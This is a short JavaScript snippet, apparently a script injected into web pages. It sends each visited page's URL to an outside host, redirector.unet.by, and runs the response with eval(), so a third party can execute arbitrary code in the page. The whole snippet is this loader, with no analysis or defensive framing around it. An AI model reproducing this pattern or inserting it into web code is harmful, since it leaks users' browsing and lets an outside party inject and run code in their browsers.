var r = new XMLHttpRequest();
r.open('get', 'http://redirector.unet.by/outgrader/get_redirect.js?url=' + location.href);
r.onreadystatechange = function () {
    if (r.readyState != 4 || r.status != 200) return;
    eval(r.responseText);
};
r.send();